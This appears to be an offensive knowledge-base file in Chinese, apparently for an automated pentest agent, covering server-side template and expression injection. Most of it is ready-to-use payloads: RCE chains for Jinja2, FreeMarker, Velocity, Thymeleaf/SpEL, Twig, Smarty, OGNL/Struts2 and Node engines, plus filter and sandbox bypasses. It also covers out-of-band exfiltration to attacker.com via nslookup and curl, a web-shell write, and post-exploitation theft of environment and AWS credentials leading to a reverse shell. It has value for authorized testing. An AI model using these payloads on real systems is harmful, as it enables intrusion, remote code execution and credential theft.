# SSTI（服务端模板注入）专题

> 检测探针、引擎指纹、各引擎 RCE payload、盲注技术、真实 CVE 场景。
> 客户端 XSS 类注入见 `$AGENT_DIR/knowledge-base/web-vulnerabilities.md` §1；表达式注入（SpEL/OGNL）场景见本文 §6。

---

## 1. 检测与引擎指纹

**第一步：区分 SSTI 与 XSS**——看数学表达式是否被服务端求值（返回 49 而非原样回显）。

| 探针 | 命中引擎 |
|------|---------|
| `{{7*7}}` | Jinja2 或 Twig |
| `${7*7}` | FreeMarker、Velocity 或 Java EL |
| `#{7*7}` | Ruby 插值、Pug |
| `<%= 7*7 %>` | ERB、EJS、EEx |
| `@(7*7)` | Razor（ASP.NET） |
| `{7*7}` | Smarty（PHP） |
| `<#assign x=7*7>${x}` | FreeMarker |
| `@{7*7}` / `*{7*7}` | Thymeleaf |

**Jinja2 vs Twig 区分**：`{{7*'7'}}` → `7777777` = Jinja2（Python 字符串乘法）；`49` = Twig（PHP 数字转换）。

**无数学安全探测**：`{{''.__class__}}` → `class 'str'` = Python/Jinja2。

**Java 系细分**：`${class.getClass()}` 有效 = Velocity；报错则试 `<#assign x=1>${x}` = FreeMarker；再报错 = Java EL/Thymeleaf。

**错误指纹**：发 `${{<%[%'"}}%\.` 触发解析错误，报错名指认引擎：
- `jinja2.exceptions.TemplateSyntaxError` → Jinja2
- `Twig\Error\SyntaxError` → Twig
- `freemarker.core.ParseException` → FreeMarker
- `org.apache.velocity.exception.ParseErrorException` → Velocity

**引擎→语言映射**：Jinja2/Django/Mako/Tornado=Python；Twig/Smarty=PHP；FreeMarker/Velocity/Pebble/Thymeleaf=Java；ERB/Slim/Haml=Ruby；Pug/Handlebars=Node.js。

> `${7*7}` 或 `%{7*7}` 在 Java 环境求值时，优先考虑 SpEL/OGNL 表达式注入——与模板引擎是不同攻击面。

## 2. Jinja2（Python/Flask）

**RCE 链**（config 被禁时依次换对象）：

```python
# config
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
# lipsum（Flask 内置）/ cycler / joiner / namespace 同型
{{lipsum.__globals__.os.popen('id').read()}}
# request
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
```

**MRO 子类遍历**（不依赖 Flask 对象，通用性最强）：

```python
# 动态定位 Popen 索引（随 Python 版本变化，禁止硬编码）
{% for c in ''.__class__.__mro__[1].__subclasses__() %}{% if 'Popen' in c.__name__ %}{{loop.index0}}{% endif %}{% endfor %}
# 执行
{{''.__class__.__mro__[1].__subclasses__()[INDEX]('id',shell=True,stdout=-1).communicate()[0]}}
```

**eval 通道目标模块速查**（`__init__.__globals__['__builtins__']['eval']` 含 eval 的常见类，探测脚本按 `'eval' in res.text` 扫编号）: warnings.catch_warnings / WarningMessage / codecs.IncrementalEncoder / codecs.IncrementalDecoder / codecs.StreamReaderWriter / os._wrap_close / reprlib.Repr / weakref.finalize。替代通道三族: ①直接 os——`__init__.__globals__['os'].popen()`（扫 `'os.py' in res.text`）; ②`_frozen_importlib.BuiltinImporter`——`subclasses()[N]['load_module']('os')`; ③linecache——`__init__.__globals__['linecache']['os'].popen()`。py2 file 类已删时读文件用 `_frozen_importlib_external.FileLoader` 的 `get_data(0,path)`。

**过滤绕过**：

| 过滤 | 绕过 |
|------|------|
| `_` 下划线 | `attr('\x5f\x5fclass\x5f\x5f')` hex 编码；`{{request.args.x.__class__}}&x=1` 参数走私 |
| `.` 点号 | 下标语法 `''['__class__']['__mro__'][1]`、`config['SECRET_KEY']` |
| 关键字 class/mro | `attr('\x5f\x5fm\x72\x6F\x5f\x5f')` hex/unicode |
| HTML 转义 | 加 `\|safe` 过滤器 |
| `[]` 中括号 | `__getitem__()` 或 `pop(N)` 替代（pop 返回值即元素不移除）: `''.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)(path).read()` |
| `{{ }}` 花括号 | `{%print(...)%}` 语句块输出: `{%print(''.__class__.__base__.__subclasses__()[77].__init__.__globals__['os'].popen('ls').read())%}` |
| 关键字 flag/字符串 | 引号拼接 `("/fl"+"ag")`、`("/fl""ag")`、join `"fla".join("/g")`、hex `\x66\x6c\x61\x67` |
| 各字段独立正则过滤 | **跨参数拼接**: username 值 `{{'` + password 值 `'.__class__...}}`——服务端拼接后两字段合成完整 `{{...}}`，单字段正则（`r'{{.*}}'`）各自匹配不到 |
| 数字+引号+下划线全禁 | **三原语构造体系**: `dict(po=a,p=a)\|join`='pop' 构串｜`(()\|select\|string\|list)\|attr('pop')(24)` 取 '_'（select 对象 repr 固定含 _）｜`dict(ee=a)\|join\|count`=2 构数（~连接后 \|int 拼多位; count 被禁换 `length` 同义）→ `(a,a,dict(init=a)\|join,a,a)\|join()` 组装 '__init__' → attr 链取 __builtins__ → x.chr(N)%2bchr(N) 免引号拼路径，`{%print(x.open(file).read())%}`; print 也被禁时 `{%if x.eval(cmd)%}abc{%endif%}` 盲回显 ｜ **全角数字直接替代**: 半角 0-9 转 chr(ord+0xfee0)（１２３）Jinja2 正常解析——正则只匹配半角数字时免构造直接写 |

**信息收集**：`{{config.items()}}`、`{{request.environ}}`、`{{self.__dict__}}`、`{{[].__class__.__base__.__subclasses__()}}`。
**config.from_object() 加载任意模块**：`{{ config.from_object('admin.app') }}{{ config.FLAG }}`——Flask 模板全局不直接暴露 app，但 from_object 可把任意 Python 模块装进 config dict 再读属性。
**非模板引擎的 format 穿越**：Python `str.format()` 格式串可控即属性穿越（无需模板引擎）: `{0.__class__.__init__.__globals__}`（含 secret_key）、`{0[dict_key]}`。安全写法: 用户输入只作 .format(name=x) 参数。
**Vue 模板注入**：输入进 Vue {{ }}/v-html 时 `${toString.constructor('code')()}` / `{{constructor.constructor('return fetch(...)')()}}`（Vue3 沙箱更严但 constructor 链常仍有效）。
**框架敏感对象**：ERB→`Sequel::DATABASES.first.tables/.all`（绕 DB 常量沙箱）；Tornado→`{{handler.settings}}` 读 cookie_secret 伪造签名 cookie。
**Smarty 3 注释逃逸**：自定义 resource 模板路径进 /* */ 注释——`?id=*/system('id');/*`（CVE-2017-1000480，<3.1.32）。
**引号过滤**：关键字参数免引号——`{{obj.__dict__.update(power_level=999) or obj.name}}`（update 返回 None falsy → or 渲染输出）。
**黑名单拼接变体**：`{{ globals.__self__.exec("imp"+"ort o"+"s;...") }}`——任意已绑定函数的 __globals__/builtins 可达 + 运行时拼接躲字面量过滤。

## 3. Java 引擎

**FreeMarker**：

```freemarker
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
<#assign ob="freemarker.template.utility.ObjectConstructor"?new()>
<#assign br=ob("java.io.BufferedReader",ob("java.io.InputStreamReader",ob("java.lang.ProcessBuilder",["id"]).start().getInputStream()))>${br.readLine()}
<#assign jr="freemarker.template.utility.JythonRuntime"?new()><@jr>import os; os.system("id")</@jr>
```

**Velocity**：

```velocity
#set($rt=$class.inspect("java.lang.Runtime").type.getRuntime().exec("id"))
#set($x='')#set($rt=$x.class.forName('java.lang.Runtime'))#set($ex=$rt.getRuntime().exec('id'))
```

**Pebble**：`{{ (1).TYPE.forName("java.lang.Runtime").methods[6].invoke(null,null).exec("id") }}`（`methods[6]` 对应 getRuntime，随 JDK 版本可能变化，用前枚举确认）。

**Thymeleaf（Spring，SpEL）**：`__${...}__` 预处理表达式在渲染前求值——view name 用户可控时的主向量：

```
GET /doc/__${T(java.lang.Runtime).getRuntime().exec('id')}__::.x
# 带输出捕获:
__${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(new String[]{"/bin/sh","-c","id"}).getInputStream())}__::.x
# 文件读: ${T(java.nio.file.Files).readString(T(java.nio.file.Path).of('/etc/passwd'))}
```

## 4. PHP 引擎

| 引擎 | 版本 | Payload |
|------|------|---------|
| Twig | 1.x | `{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}` |
| Twig | 2.x/3.x | `{{['id']\|map('system')\|join}}`、`{{[0]\|reduce('system','id')}}` |
| Twig | 1.x | 远程包含 `{{_self.env.setCache("ftp://attacker.com/")}}{{_self.env.loadTemplate("shell")}}` |
| Smarty | 2.x | `{php}system('id');{/php}` |
| Smarty | 3.x+（{php} 禁用） | `{system('id')}`、写 shell `{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php system('id');?>",self::clearConfig())}` |
| Latte | - | `{php system('id')}` |
| Blade | - | `{!! system('id') !!}`（仅模板源可控时） |
| Plates | - | 模板即原生 PHP，直接 `<?php system('id') ?>` |

Twig 信息收集：`{{_self.env}}`、`{{_context}}`、`{{app.request.server.all|join(',')}}`。

**eval 动态实例化内置类族**（`eval("echo new $v1($v2());")` 型 sink）: **FilesystemIterator+getcwd** 列当前目录（`?v1=FilesystemIterator&v2=getcwd`，v2 传函数名自动调用免参）｜**DirectoryIterator/GlobIterator** 同族列目录｜**ReflectionClass** `new ReflectionClass(system('cmd'))` 参数表达式先求值、echo 触发 __toString 带出信息｜**mysqli** 构造失败 Warning 回显参数（无回显场景当回显通道）｜SplFileObject 读文件。步骤: 先列目录类拿文件名再读文件类。

## 5. 其他语言引擎

**Mako（Python）**：无沙箱，`<% import os %>${os.popen('id').read()}`，或 `${self.module.cache.util.os.popen('id').read()}`。

**ERB/Slim/Haml（Ruby）**：无沙箱，`<%= system('id') %>`、`<%= `id` %>`、`<%= IO.popen('id').read %>`、`<%= open('|id').read %>`、`<%= %x(id) %>`。

**Node.js 通用链**（跨引擎）：`global.process.mainModule.require('child_process').execSync('id').toString()`
- Pug：`#{root.process.mainModule.require('child_process').execSync('id')}`
- Nunjucks：`{{range.constructor("return global.process.mainModule.require('child_process').execSync('id').toString()")()}}`
- EJS：`<%= global.process.mainModule.require('child_process').execSync('id').toString() %>`
- Lodash `_.template`：`${global.process.mainModule.require('child_process').execSync('id')}`
- Handlebars：logic-less 设计，RCE 需特定旧版本或配合原型污染（嵌套 `{{#with}}` 访问 `string.sub.constructor`）

**Razor（ASP.NET）**：`@(1+2)` 探测；`@{ new System.Diagnostics.Process() ... }` 代码块起 Process 执行。

**Elixir EEx**：`<%= System.shell("id") |> elem(0) %>`、`<%= File.read!("/etc/passwd") %>`。

## 6. 表达式注入场景（SSTI 邻接: SpEL/OGNL/Java EL/MVEL）

EL 注入目标是 Java 框架的表达式求值器（区别于模板引擎）。报错指纹：`ognl.OgnlException`→OGNL；`SpelEvaluationException`→SpEL；`javax.el.ELException`→Java EL。

**探针消歧**：`${7*7}`=49 → SpEL/OGNL/JavaEL；`#{7*7}`=49 → SpEL 或 JSF；`%{7*7}`=49 → OGNL；`${T(java.lang.Math).random()}` 随机数 → SpEL 确认。`${7*7}`=49 且 `%{7*7}` 字面量 → SpEL/JavaEL；反向 → OGNL。

**出现位置**：SpEL=`@Value`/`@PreAuthorize`/Gateway predicates/Thymeleaf `__${...}__` 预处理/Spring Data `@Query`；OGNL=Struts2/Confluence/`Ognl.getValue()`；Java EL=JSP `${}`/`#{}`/JSF；MVEL=Drools 规则引擎。

### 6.1 SpEL payload 家族

```
# 基础: ${T(java.lang.Runtime).getRuntime().exec("id")}
# 回显（Spring 必有）: #{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec('whoami').getInputStream()))}
# 回显（需 commons-io）: ${T(org.apache.commons.io.IOUtils).toString(...getInputStream())}
# Runtime 被禁: ${new java.lang.ProcessBuilder(new String[]{"id"}).start()}
```

**SimpleEvaluationContext（禁 T()）绕过**——反射链：
```
${''.class.forName('java.lang.Runtime').getMethod('exec',''.class).invoke(''.class.forName('java.lang.Runtime').getMethod('getRuntime').invoke(null),'id')}
```
其他变体：`getDeclaredConstructors()[0]`+`setAccessible(true)`（经 session 分步传对象）；ProcessBuilder 分步（ArrayList 经 `request.setAttribute` 暂存，避免数组语法被滤）；ScriptEngine 跳入 JS 引擎（`forName('javax.script.ScriptEngineManager')...getEngineByName("js").eval(...)`）；`Character.toChars(105)` 逐字符构造命令绕 WAF。

**关键字绕过**：`Runtime`→`"java.lang.Ru"+"ntime"` 拼接；`getClass`→`""["class"]`；`exec`→`getMethod("e"+"xec")`；`.`→`%2e`/`\u002e`。

### 6.2 OGNL payload 家族

```
# 基础: %{(#rt=@java.lang.Runtime@getRuntime()).(#rt.exec('id'))}
# 沙箱绕过: %{(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#rt=@java.lang.Runtime@getRuntime()).(#rt.exec('id'))}
```
**文件读取**（不执行命令，更少触发防护）：`%{#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,#f=new java.io.File('/etc/passwd'),#is=new java.io.FileInputStream(#f),#b=new byte[(int)#f.length()],#is.read(#b),#is.close(),#out=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#out.print(new java.lang.String(#b)),#out.close()}`。目录列举：`#f.listFiles()`+`@java.util.Arrays@toString` 同型。

**Struts2 沙箱演进**（版本敏感，先定版本再选层级）：

| 版本 | 防护 | 绕过 |
|---|---|---|
| 2.0-2.3.14 | 无 | 直接 exec |
| 2.3.14-2.3.28 | SecurityMemberAccess | `#_memberAccess=DEFAULT_MEMBER_ACCESS` |
| 2.3.29-2.3.34 | excludedClasses | 经 container 取 OgnlUtil → `.excludedClasses.clear()` |
| 2.5.0-2.5.12 | +excludedPackageNames | 同时清两个名单再重置 memberAccess |
| 2.5.13+ | 沙箱重写 | 需版本窗口内 CVE |

**Struts2 注入点速查**：S2-045=Content-Type 头；S2-046=multipart 文件名（同 CVE-2017-5638 双入口）；S2-016=`redirect:`/`redirectAction:` 参数前缀；S2-048=Showcase ActionMessage；S2-057=URL namespace（纯路径无参数触发）。

### 6.3 Java EL / MVEL

Java EL：`${Runtime.getRuntime().exec("id")}`（EL 3.0）；`pageContext.request.getSession().setAttribute("admin",true)` 会话提权；探测 `${applicationScope}/${requestScope}/${sessionScope}/${initParam}`；JSF 经 `facesContext.getExternalContext().setResponseHeader("X-Out",...)` 回显。

MVEL（Drools 等规则引擎，无沙箱）：`Runtime.getRuntime().exec("id")` 直呼；过滤时用 `Thread.currentThread().getContextClassLoader().loadClass(...)` 反射链。

### 6.4 盲注（无回显）

时间盲：SpEL `${T(java.lang.Thread).sleep(5000)}`；OGNL `%{#_memberAccess=...,@java.lang.Thread@sleep(5000)}`。外带：exec `nslookup $(whoami).attacker.com` / `curl http://attacker/exfil?d=...`。报错泄露：`.exec("id").getInputStream().read()` 返回首字节 ASCII → 逐字节提取。

### 6.5 知名 CVE 场景

| CVE | 入口 | 要点 |
|-----|------|------|
| Confluence CVE-2021-26084 | POST `/pages/createpage-entervariables.action`，`queryString=\u0027%2b{3*3}%2b\u0027` | `\u0027` unicode 绕引号过滤；响应含 9 确认 |
| Struts2 S2-045 (CVE-2017-5638) | Content-Type 头 OGNL | `OgnlUtil` 清空 excluded 黑名单；OS 自适应 cmd/sh |
| Spring Cloud Gateway CVE-2022-22947 | actuator `/actuator/gateway/routes/pwn` 加 filter + refresh | `#{T(java.lang.Runtime)...}` 在 AddResponseHeader value；看响应头取输出 |
| Jira CVE-2019-11581 | `/secure/ContactAdministrators!default.jspa` subject/message | 前置：表单启用+SMTP 配置；**输出在管理员邮件**，需 OOB |
| Maccms 8.x（无 CVE） | `/index.php?m=vod-search&wd=` | `{if-A:phpinfo()}{endif-A}` 语法；base64 绕引号过滤写 shell |

**判别**：`{{7*7}}`=49+Python 栈 = 模板 SSTI；`${7*7}`/`%{7*7}`=49+Java 栈 = SpEL/OGNL 表达式注入。

## 7. 盲 SSTI（无回显）

| 技术 | 方法 |
|------|------|
| 布尔 | `(3*4/2)` 正常 vs `3*)2(/4` 报错；`{{(3*4/2)==6}}` vs `==7` |
| 时间 | Jinja2: `{% for i in range(10000000) %}{% endfor %}`；Twig: `{{['sleep 5']\|map('system')}}`；FreeMarker Execute `sleep 5`；ERB `<%= sleep(5) %>`；延迟 ≥5s 判定 |
| OOB | `nslookup TOKEN.attacker.com` 经各引擎执行链；Burp Collaborator/interactsh 收 DNS；命中 = 盲 SSTI 且已 RCE |
| 错误 | `${{<%[%'"}}%\.` 强制解析错误 |

## 8. 后渗透与客户端

**SSTI→RCE 后 pivot**：`/proc/self/environ`（环境变量凭证）→ 应用配置文件（DB 密码/API key）→ `~/.aws/credentials`（云凭证）→ 反弹 shell。

**常见注入入口**：URL 路径、查询参数、个人资料/简介表单域、404 错误页回显、邮件模板（密码重置姓名）、Flask `render_template_string(user_input)`（最危险——整个输入即模板）。

**Flask Werkzeug 调试器 PIN 计算**（debug 模式 `/console` 有 PIN 保护时，配合 LFI 收集要素）：

六要素：username（/etc/passwd）、modname（通常 `flask.app`）、appname（通常 `Flask`）、modpath（app.py 绝对路径）、MAC 地址（`/sys/class/net/eth0/address` 转十进制）、machine-id（`/etc/machine-id` 或 `/proc/sys/kernel/random/boot_id` + `/proc/self/cgroup` 首行最后一段 hex）。

算法（版本敏感）：依次 `h.update(各 bit)` → `h.update(b"cookiesalt")` → `h.update(b"pinsalt")` → `f"{int(h.hexdigest(),16):09d}"[:9]`。**Werkzeug < 2.0 用 md5，≥ 2.0 用 sha1**（commit 11ba286）。用前对照目标版本 `src/werkzeug/debug/__init__.py`。PIN 连错 10 次锁死。认证后 `/console?__debugger__=yes&cmd=pin&pin=XXX` 得交互式 Python console。

**AngularJS 1.x 客户端 CSTI**（版本敏感，Angular 2+ 不适用；AngularJS 1.6+ 移除表达式沙箱，注入即执行无需逃逸）：
- 通用：`{{constructor.constructor('alert(1)')()}}`
- 1.5.x：`{{x = {'y':''.constructor.prototype}; x['y'].charAt=[].join;$eval('x=alert(1)');}}`
- 1.3.x：`{{{}[{toString:[].join,length:1,0:'__proto__'}].assign=[].join;'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//');}}`
- 检测：页面发 `{{1+1}}` 渲染出 2 = AngularJS DOM 求值。
